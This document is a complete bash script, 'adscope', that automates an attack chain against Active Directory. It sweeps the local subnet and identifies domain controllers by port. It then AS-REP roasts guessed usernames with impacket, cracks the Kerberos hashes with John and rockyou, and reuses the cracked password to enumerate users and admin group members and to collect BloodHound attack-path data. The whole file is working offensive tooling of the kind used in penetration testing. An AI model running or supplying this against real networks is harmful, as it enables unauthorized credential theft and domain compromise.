#!/bin/bash

# ============================================================
# adscope - Active Directory Recon
# ============================================================

banner() {
    cat << "EOF"
    ___    ____  _____                  
   /   |  / __ \/ ___/_________  ____  
  / /| | / / / /\__ \/ ___/ __ \/ __ \ 
 / ___ |/ /_/ /___/ / /__/ /_/ / /_/ / 
/_/  |_/_____//____/\___/\____/ .___/  
                             /_/       
        Active Directory Recon
EOF
    echo "        v1.0 | $(date +%Y-%m-%d)"
    echo
}

# ------------------------------------------------------------
# Interface selection
# ------------------------------------------------------------
select_interface() {
    mapfile -t IFACES < <(
        ip -o -4 addr show \
          | awk '$2 !~ /^(lo|docker|virbr|veth|tap|br-)/ {print $2}' \
          | sort -u
    )

    if [[ ${#IFACES[@]} -eq 0 ]]; then
        echo "[!] No usable IPv4 interfaces found." >&2
        exit 1
    fi

    if [[ -n "$1" ]]; then
        for i in "${IFACES[@]}"; do
            [[ "$i" == "$1" ]] && { echo "$i"; return 0; }
        done
        echo "[!] Interface '$1' not found." >&2
        exit 1
    fi

    if [[ ! -t 0 ]]; then
        echo "${IFACES[0]}"
        return 0
    fi

    echo "[*] Available interfaces:" >&2
    local idx=1
    for i in "${IFACES[@]}"; do
        local cidr
        cidr=$(ip -o -4 addr show "$i" | awk '{print $4; exit}')
        printf "    %d) %-12s %s\n" "$idx" "$i" "$cidr" >&2
        ((idx++))
    done

    local choice
    while :; do
        read -rp "[?] Select interface [1-${#IFACES[@]}]: " choice
        if [[ "$choice" =~ ^[0-9]+$ ]] && (( choice >= 1 && choice <= ${#IFACES[@]} )); then
            echo "${IFACES[$((choice-1))]}"
            return 0
        fi
        echo "    [!] Invalid selection." >&2
    done
}

# ------------------------------------------------------------
# CIDR derivation from interface
# ------------------------------------------------------------
cidr_for_iface() {
    local iface="$1" cidr ip mask a b c d net
    cidr=$(ip -o -4 addr show "$iface" | awk '{print $4; exit}')
    [[ -z "$cidr" ]] && return 1

    ip="${cidr%/*}"
    mask="${cidr#*/}"
    IFS=. read -r a b c d <<< "$ip"
    net=$(( (a<<24 | b<<16 | c<<8 | d) & (~0 << (32-mask)) ))
    printf "%d.%d.%d.%d/%d\n" \
      $((net>>24 & 255)) $((net>>16 & 255)) \
      $((net>>8 & 255)) $((net & 255)) "$mask"
}

# ------------------------------------------------------------
# Phase 1: Sweep subnet, split into confirmed + candidates
# ------------------------------------------------------------
sweep_subnet() {
    local subnet="$1" confirmed="$2" candidates="$3"

    echo "[*] Sweeping $subnet with fping..." >&2
    fping -a -q -g "$subnet" 2>/dev/null | sort -u > /tmp/adscope_fping.txt

    sleep 1

    echo "[*] Reading ARP cache..." >&2
    ip neigh show \
      | awk '$1 ~ /^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$/ && $6 != "FAILED" && $6 != "INCOMPLETE" {print $1}' \
      | sort -u > /tmp/adscope_arp.txt

    comm -12 /tmp/adscope_fping.txt /tmp/adscope_arp.txt > "$confirmed"
    comm -13 /tmp/adscope_fping.txt /tmp/adscope_arp.txt > "$candidates"

    local fping_count arp_count conf_count cand_count
    fping_count=$(wc -l < /tmp/adscope_fping.txt)
    arp_count=$(wc -l < /tmp/adscope_arp.txt)
    conf_count=$(wc -l < "$confirmed")
    cand_count=$(wc -l < "$candidates")

    echo "[*] fping returned:        $fping_count" >&2
    echo "[*] ARP cache had:         $arp_count" >&2
    echo "[*] Confirmed live:        $conf_count" >&2
    echo "[*] ARP-only candidates:   $cand_count" >&2
}

# ------------------------------------------------------------
# Phase 2: Identify DC candidates by port signature
# ------------------------------------------------------------
find_dcs() {
    local infile="$1" outfile="$2"
    local gnmap="/tmp/adscope_dc_scan.gnmap"

    if [[ ! -s "$infile" ]]; then
        echo "[!] No live hosts to scan." >&2
        return 1
    fi

    echo "[*] Scanning for DC ports (88, 389, 445)..." >&2
    nmap -Pn -n -T4 --open -p 88,389,445 -iL "$infile" -oG "$gnmap" >/dev/null 2>&1

    awk '/Ports:/ && /88\/open/ && /389\/open/ && /445\/open/ {print $2}' \
        "$gnmap" | sort -u > "$outfile"

    local count
    count=$(wc -l < "$outfile")
    if (( count == 0 )); then
        echo "[!] No DC candidates found." >&2
        return 1
    fi

    echo "[*] DC candidates: $count" >&2
    while read -r dc; do
        echo "    -> $dc" >&2
    done < "$outfile"
}

# ------------------------------------------------------------
# Phase 3: DC recon — RootDSE, SMB null session
# ------------------------------------------------------------
recon_dc() {
    local dc="$1"
    local outdir="recon_${dc//./_}"
    mkdir -p "$outdir"

    echo "[*] === Recon on $dc ===" >&2

    echo "[*] TCP RootDSE query..." >&2
    local base_dn
    base_dn=$(ldapsearch -x -LLL -H "ldap://$dc" -s base -b "" namingContexts 2>/dev/null \
        | awk -F': ' '/^namingContexts:/ {print $2; exit}')
    if [[ -n "$base_dn" ]]; then
        echo "[+] Naming context: $base_dn" >&2
        echo "$base_dn" > "$outdir/base_dn.txt"
    else
        echo "[-] Could not retrieve naming context." >&2
    fi

    echo "[*] SMB null session check..." >&2
    nxc smb "$dc" -u '' -p '' 2>&1 | tee "$outdir/smb_null.txt" >&2

    echo "[*] LDAP signing check..." >&2
    local signing
    signing=$(nmap -p 389 --script ldap-rootdse "$dc" 2>/dev/null \
        | grep -i "signing" | head -1)
    if [[ -n "$signing" ]]; then
        echo "    $signing" >&2
    else
        echo "    (no explicit signing info in rootDSE)" >&2
    fi

    echo "[*] Results saved to $outdir/" >&2
}

# ------------------------------------------------------------
# Helper: derive domain from DC
# ------------------------------------------------------------
domain_for_dc() {
    local dc="$1"
    ldapsearch -x -LLL -H "ldap://$dc" -s base -b "" namingContexts 2>/dev/null \
        | awk -F': ' '/^namingContexts:/ {print $2; exit}' \
        | sed -E 's/^DC=//I; s/,DC=/./gI'
}

# ------------------------------------------------------------
# Phase 4: AS-REP roasting with casing sweep
# ------------------------------------------------------------
asrep_roast() {
    local dc="$1"
    local domain="$2"
    local wordlist="$3"
    local outdir="recon_${dc//./_}"
    local combined="$outdir/asrep_all.hashes"

    if [[ ! -f "$wordlist" ]]; then
        echo "[!] Wordlist not found: $wordlist" >&2
        return 1
    fi

    if [[ -z "$domain" ]]; then
        echo "[!] Domain unknown — cannot AS-REP roast." >&2
        return 1
    fi

    if ! command -v impacket-GetNPUsers >/dev/null 2>&1; then
        echo "[!] impacket-GetNPUsers not found (install impacket)." >&2
        return 1
    fi

    echo "[*] === AS-REP roasting $domain (DC: $dc) ===" >&2

    awk '{print tolower($0)}' "$wordlist" > /tmp/adscope_users_lower.txt
    awk '{print toupper(substr($0,1,1)) tolower(substr($0,2))}' "$wordlist" > /tmp/adscope_users_title.txt
    awk '{print toupper($0)}' "$wordlist" > /tmp/adscope_users_upper.txt

    : > "$combined"

    local variant hashfile count total
    total=0
    for variant in lower title upper; do
        hashfile="$outdir/asrep_${variant}.hashes"
        echo "[*] Trying $variant-cased usernames..." >&2

        impacket-GetNPUsers "${domain}/" \
            -usersfile "/tmp/adscope_users_${variant}.txt" \
            -no-pass \
            -dc-ip "$dc" \
            -format john \
            -outputfile "$hashfile" 2>/dev/null

        if [[ -s "$hashfile" ]]; then
            count=$(grep -c '^\$krb5asrep\$' "$hashfile" 2>/dev/null || echo 0)
            total=$(( total + count ))
            echo "[+] $variant: $count hash(es)" >&2
            cat "$hashfile" >> "$combined"
        else
            echo "[-] $variant: 0 hashes" >&2
        fi
    done

    if [[ -s "$combined" ]]; then
        sort -u "$combined" -o "$combined"
        echo "[+] Total unique AS-REP hashes: $(grep -c '^\$krb5asrep\$' "$combined")" >&2
        echo "[+] Hashes saved to $combined" >&2
    else
        echo "[-] No AS-REP roastable accounts found." >&2
    fi
}

# ------------------------------------------------------------
# Phase 5: Crack AS-REP hashes with John
# ------------------------------------------------------------
crack_asrep() {
    local hashfile="$1"
    local wordlist="$2"
    local outdir
    outdir=$(dirname "$hashfile")
    local potfile="$outdir/john.pot"
    local cracked_out="$outdir/cracked.txt"

    if [[ ! -s "$hashfile" ]]; then
        echo "[-] No hashes to crack." >&2
        return 1
    fi

    if ! command -v john >/dev/null 2>&1; then
        echo "[!] john not found (install john)." >&2
        return 1
    fi

    local chosen_wordlist=""
    if [[ -n "$wordlist" ]] && [[ -f "$wordlist" ]]; then
        chosen_wordlist="$wordlist"
    else
        if [[ -t 0 ]]; then
            echo
            echo "[?] Wordlist for cracking:"
            echo "    1) /usr/share/wordlists/rockyou.txt (default)"
            echo "    2) Custom path"
            local wl_choice
            read -rp "[?] Select [1-2]: " wl_choice
            case "$wl_choice" in
                2)
                    local custom_wl
                    read -rp "[?] Enter path to wordlist: " custom_wl
                    if [[ -f "$custom_wl" ]]; then
                        chosen_wordlist="$custom_wl"
                    else
                        echo "[!] File not found: $custom_wl" >&2
                        return 1
                    fi
                    ;;
                *)
                    chosen_wordlist="/usr/share/wordlists/rockyou.txt"
                    ;;
            esac
        else
            chosen_wordlist="/usr/share/wordlists/rockyou.txt"
        fi
    fi

    if [[ "$chosen_wordlist" == *.gz ]]; then
        local decompressed="/tmp/adscope_rockyou.txt"
        echo "[*] Decompressing $chosen_wordlist..." >&2
        gunzip -c "$chosen_wordlist" > "$decompressed"
        chosen_wordlist="$decompressed"
    fi

    if [[ ! -f "$chosen_wordlist" ]]; then
        echo "[!] Wordlist not found: $chosen_wordlist" >&2
        return 1
    fi

    echo "[*] === Cracking AS-REP hashes ===" >&2
    echo "[*] Hash file : $hashfile" >&2
    echo "[*] Wordlist  : $chosen_wordlist" >&2

    john --format=krb5asrep \
         --wordlist="$chosen_wordlist" \
         --pot="$potfile" \
         "$hashfile" 2>&1 | tee "$outdir/john_run.log" >&2

    echo
    echo "[*] Cracked credentials:" >&2
    john --show --format=krb5asrep --pot="$potfile" "$hashfile" \
        | tee "$cracked_out" >&2

    if [[ -s "$cracked_out" ]]; then
        echo "[+] Cracked output saved to $cracked_out" >&2
    else
        echo "[-] No passwords cracked with this wordlist." >&2
    fi
}

# ------------------------------------------------------------
# Helper: parse John's cracked.txt to extract bare username
# ------------------------------------------------------------
parse_cracked_user() {
    local cracked_file="$1"
    local raw_user
    raw_user=$(head -1 "$cracked_file" | cut -d: -f1)
    echo "$raw_user" \
        | sed -E 's/^\$krb5asrep\$([0-9]+\$)?//' \
        | cut -d@ -f1
}

parse_cracked_pass() {
    local cracked_file="$1"
    head -1 "$cracked_file" | cut -d: -f2-
}

# ------------------------------------------------------------
# Phase 6: Enumerate users and groups
# ------------------------------------------------------------
enumerate_users_groups() {
    local dc="$1"
    local domain="$2"
    local username="$3"
    local password="$4"
    local outdir="recon_${dc//./_}"
    local base_dn
    base_dn=$(cat "$outdir/base_dn.txt" 2>/dev/null)

    if [[ -z "$base_dn" ]]; then
        echo "[!] Base DN not found — skipping enumeration." >&2
        return 1
    fi

    echo "[*] === User and group enumeration ===" >&2

    # --- Users ---
    echo "[*] Enumerating users..." >&2
    ldapsearch -x -LLL \
        -H "ldap://$dc" \
        -D "$username@$domain" \
        -w "$password" \
        -b "$base_dn" \
        "(objectClass=user)" \
        sAMAccountName userPrincipalName memberOf description \
        2>/dev/null > "$outdir/users_raw.txt"

    awk -F': ' '/^sAMAccountName:/ {print $2}' "$outdir/users_raw.txt" \
        | sort -u > "$outdir/users.txt"

    local user_count
    user_count=$(wc -l < "$outdir/users.txt")
    echo "[+] Users found: $user_count" >&2

    # --- Groups ---
    echo "[*] Enumerating groups..." >&2
    ldapsearch -x -LLL \
        -H "ldap://$dc" \
        -D "$username@$domain" \
        -w "$password" \
        -b "$base_dn" \
        "(objectClass=group)" \
        cn member \
        2>/dev/null > "$outdir/groups_raw.txt"

    awk -F': ' '/^cn:/ {print $2}' "$outdir/groups_raw.txt" \
        | sort -u > "$outdir/groups.txt"

    local group_count
    group_count=$(wc -l < "$outdir/groups.txt")
    echo "[+] Groups found: $group_count" >&2

    # --- Display summary ---
    echo "" >&2
    echo "────────────────────────────────────────" >&2
    echo " USERS (first 20 of $user_count)" >&2
    echo "────────────────────────────────────────" >&2
    head -20 "$outdir/users.txt" >&2
    if (( user_count > 20 )); then
        echo "  ... and $(( user_count - 20 )) more" >&2
    fi

    echo "" >&2
    echo "────────────────────────────────────────" >&2
    echo " GROUPS (first 20 of $group_count)" >&2
    echo "────────────────────────────────────────" >&2
    head -20 "$outdir/groups.txt" >&2
    if (( group_count > 20 )); then
        echo "  ... and $(( group_count - 20 )) more" >&2
    fi

    # --- High-value group members ---
    echo "" >&2
    echo "────────────────────────────────────────" >&2
    echo " HIGH-VALUE GROUP MEMBERS" >&2
    echo "────────────────────────────────────────" >&2

    local group members
    for group in "Domain Admins" "Enterprise Admins" "Administrators" \
                 "Domain Controllers" "Account Operators" "Backup Operators" \
                 "Server Operators" "Remote Desktop Users"
    do
        members=$(ldapsearch -x -LLL \
            -H "ldap://$dc" \
            -D "$username@$domain" \
            -w "$password" \
            -b "$base_dn" \
            "(&(objectClass=group)(cn=$group))" \
            member 2>/dev/null \
            | grep '^member:' \
            | sed 's/^member: //' \
            | awk -F',' '{print $1}' \
            | sed 's/^CN=//' \
            | tr '\n' ',' | sed 's/,$//')

        if [[ -n "$members" ]]; then
            printf "  %-25s : %s\n" "$group" "$members" >&2
        fi
    done

    echo "" >&2
    echo "[*] Results saved to $outdir/users.txt and $outdir/groups.txt" >&2
}

# ------------------------------------------------------------
# Helper: resolve DC IP to FQDN using the DC's own DNS
# ------------------------------------------------------------
resolve_dc_fqdn() {
    local dc_ip="$1"
    local domain="$2"
    local fqdn=""

    # 1. Query the DC's own LDAP for its dNSHostName
    fqdn=$(ldapsearch -x -LLL -H "ldap://$dc_ip" -s base -b "" \
        dnsHostName 2>/dev/null \
        | awk -F': ' '/^dnsHostName:/ {print $2; exit}')

    # 2. Fallback: reverse DNS via the DC as resolver
    if [[ -z "$fqdn" ]]; then
        fqdn=$(dig +short @"$dc_ip" -x "$dc_ip" 2>/dev/null \
            | sed 's/\.$//' | head -1)
    fi

    # 3. Fallback: use nxc to get the short name and append domain
    if [[ -z "$fqdn" ]]; then
        local shortname
        shortname=$(nxc smb "$dc_ip" 2>/dev/null \
            | grep -oP 'name:\K[^)]+' | head -1)
        if [[ -n "$shortname" ]] && [[ -n "$domain" ]]; then
            fqdn="${shortname}.${domain}"
        fi
    fi

    echo "$fqdn"
}

# ------------------------------------------------------------
# Helper: temporarily switch DNS to DC for FQDN resolution
# ------------------------------------------------------------
with_dc_dns() {
    local dc_ip="$1"
    shift

    # Check if already resolvable
    if getent hosts "$1" >/dev/null 2>&1; then
        "$@"
        return $?
    fi

    echo "[*] Temporarily switching DNS to $dc_ip..." >&2

    if [[ ! -f /etc/resolv.conf.adscope.bak ]]; then
        sudo cp /etc/resolv.conf /etc/resolv.conf.adscope.bak 2>/dev/null
    fi

    echo "nameserver $dc_ip" | sudo tee /etc/resolv.conf >/dev/null
    sleep 1

    "$@"
    local rc=$?

    # Restore
    if [[ -f /etc/resolv.conf.adscope.bak ]]; then
        sudo cp /etc/resolv.conf.adscope.bak /etc/resolv.conf 2>/dev/null
        rm -f /etc/resolv.conf.adscope.bak
    fi

    return $rc
}

# ------------------------------------------------------------
# Phase 7: BloodHound data collection (FQDN-aware, DNS swap)
# ------------------------------------------------------------
collect_bloodhound_inner() {
    local dc_ip="$1"
    local dc_fqdn="$2"
    local domain="$3"
    local username="$4"
    local password="$5"
    local outdir="recon_${dc_ip//./_}"
    local bh_dir="$outdir/bloodhound"

    # Run inside bh_dir so --zip lands there (bloodhound-python
    # writes the ZIP to CWD regardless of -o when --zip is used)
    (
        cd "$bh_dir" || exit 1
        bloodhound-python \
            -d "$domain" \
            -u "$username" \
            -p "$password" \
            -dc "$dc_fqdn" \
            -ns "$dc_ip" \
            -c DCOnly \
            -o . \
            --zip
    ) 2>&1 | tee "$outdir/bloodhound_collect.log"

    if ls "$bh_dir"/*.zip >/dev/null 2>&1; then
        local zipfile
        zipfile=$(ls "$bh_dir"/*.zip 2>/dev/null | head -1)
        echo "[+] BloodHound data collected: $zipfile" >&2
        echo "[*] Import this ZIP into BloodHound GUI for attack-path analysis" >&2
    else
        echo "[-] Collection may have failed. Check $outdir/bloodhound_collect.log" >&2
    fi
}

collect_bloodhound() {
    local dc_ip="$1"
    local dc_fqdn="$2"
    local domain="$3"
    local username="$4"
    local password="$5"
    local outdir="recon_${dc_ip//./_}"
    local bh_dir="$outdir/bloodhound"

    if ! command -v bloodhound-python >/dev/null 2>&1; then
        echo "[!] bloodhound-python not found. Install: pip install bloodhound" >&2
        return 1
    fi

    echo "[*] === BloodHound data collection ===" >&2
    mkdir -p "$bh_dir"

    # Run the collection with DC-as-DNS if FQDN doesn't resolve
    with_dc_dns "$dc_ip" collect_bloodhound_inner \
        "$dc_ip" "$dc_fqdn" "$domain" "$username" "$password"
}

# ------------------------------------------------------------
# Main
# ------------------------------------------------------------
banner

# Dependency check
for cmd in fping nmap ip awk comm sort ldapsearch; do
    command -v "$cmd" >/dev/null || { echo "[!] Missing dependency: $cmd"; exit 1; }
done

# Optional tools
for opt in nxc impacket-GetNPUsers john bloodhound-python; do
    command -v "$opt" >/dev/null || echo "[!] Optional tool missing: $opt (some checks will be skipped)" >&2
done

# Arg parsing
IFACE_ARG=""
WORDLIST=""
CRACK_WORDLIST=""
while getopts "i:w:c:h" opt; do
    case "$opt" in
        i) IFACE_ARG="$OPTARG" ;;
        w) WORDLIST="$OPTARG" ;;
        c) CRACK_WORDLIST="$OPTARG" ;;
        h)
            cat <<EOF
Usage: $0 [-i <interface>] [-w <wordlist>] [-c <crack_wordlist>]

  -i <iface>            Network interface to use (skips interactive prompt)
  -w <wordlist>         Username wordlist for AS-REP roasting
                        (default: /usr/share/seclists/Usernames/top-usernames-shortlist.txt)
  -c <crack_wordlist>   Password wordlist for cracking AS-REP hashes
                        (default: /usr/share/wordlists/rockyou.txt)
EOF
            exit 0
            ;;
        *) exit 1 ;;
    esac
done

# Default username wordlist
if [[ -z "$WORDLIST" ]]; then
    for candidate in \
        /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
        /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt \
        /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt
    do
        if [[ -f "$candidate" ]]; then
            WORDLIST="$candidate"
            break
        fi
    done
fi

if [[ -z "$WORDLIST" ]]; then
    echo "[!] No username wordlist found. Use -w to specify one." >&2
    echo "[!] AS-REP roasting will be skipped." >&2
fi

# Interface + subnet
IFACE=$(select_interface "$IFACE_ARG")
SUBNET=$(cidr_for_iface "$IFACE") || { echo "[!] Could not derive CIDR."; exit 1; }

echo "[*] Interface : $IFACE"
echo "[*] Subnet    : $SUBNET"
[[ -n "$WORDLIST" ]] && echo "[*] Wordlist  : $WORDLIST"
echo

# Phase 1
sweep_subnet "$SUBNET" "live_confirmed.txt" "live_candidates.txt"
echo "[*] Confirmed written to live_confirmed.txt"
echo "[*] Candidates written to live_candidates.txt"
echo

cat live_confirmed.txt live_candidates.txt 2>/dev/null | sort -u > scan_targets.txt

MY_IP=$(ip -o -4 addr show "$IFACE" | awk '{print $4}' | cut -d/ -f1)
grep -v "^${MY_IP}$" scan_targets.txt > scan_targets.tmp && mv scan_targets.tmp scan_targets.txt

echo "[*] Scan targets (after exclusions): $(wc -l < scan_targets.txt)"
echo

# Phase 2
if find_dcs "scan_targets.txt" "dc_candidates.txt"; then
    echo "[*] DC candidates written to dc_candidates.txt"
    echo

    # Phase 3: recon all DCs first
    while read -r dc; do
        recon_dc "$dc"
        echo
    done < dc_candidates.txt

    # Phase 4-7: iterate per DC
    while read -r dc; do
        [[ -z "$dc" ]] && continue

        DOMAIN=$(domain_for_dc "$dc")

        echo "============================================================"
        echo "[*] Processing DC $dc (domain: ${DOMAIN:-unknown})"
        echo "============================================================"
        echo

        if [[ -z "$DOMAIN" ]]; then
            echo "[!] Could not determine domain for $dc — skipping." >&2
            echo
            continue
        fi

        if [[ -z "$WORDLIST" ]]; then
            echo "[!] No wordlist — skipping AS-REP roast for $dc." >&2
            echo
            continue
        fi

        # Phase 4: AS-REP roast
        asrep_roast "$dc" "$DOMAIN" "$WORDLIST"
        echo

        HASHFILE="recon_${dc//./_}/asrep_all.hashes"
        CRACKED_OUT="recon_${dc//./_}/cracked.txt"

        if [[ ! -s "$HASHFILE" ]]; then
            echo "[-] No hashes to crack for $dc — moving on." >&2
            echo
            continue
        fi

        # Phase 5: crack
        crack_asrep "$HASHFILE" "$CRACK_WORDLIST"
        echo

        # Phase 6 & 7: require cracked creds
        if [[ -s "$CRACKED_OUT" ]]; then
            CRACKED_USER=$(parse_cracked_user "$CRACKED_OUT")
            CRACKED_PASS=$(parse_cracked_pass "$CRACKED_OUT")

            if [[ -n "$CRACKED_USER" ]] && [[ -n "$CRACKED_PASS" ]]; then
                echo "[*] Cracked credential: ${CRACKED_USER}:${CRACKED_PASS}" >&2
                echo

                # Phase 6
                enumerate_users_groups "$dc" "$DOMAIN" "$CRACKED_USER" "$CRACKED_PASS"
                echo

                # Phase 7
                DC_HOSTNAME=$(resolve_dc_fqdn "$dc" "$DOMAIN")

                if [[ -n "$DC_HOSTNAME" ]]; then
                    echo "[*] DC FQDN: $DC_HOSTNAME" >&2
                    collect_bloodhound "$dc" "$DC_HOSTNAME" "$DOMAIN" "$CRACKED_USER" "$CRACKED_PASS"
                else
                    echo "[!] Could not resolve DC hostname for $dc — skipping BloodHound." >&2
                    echo "[!] Try manually: dig @$dc -x $dc" >&2
                fi
                echo
            fi
        fi
    done < dc_candidates.txt
else
    echo "[!] No DCs identified. Stopping here."
    exit 1
fi
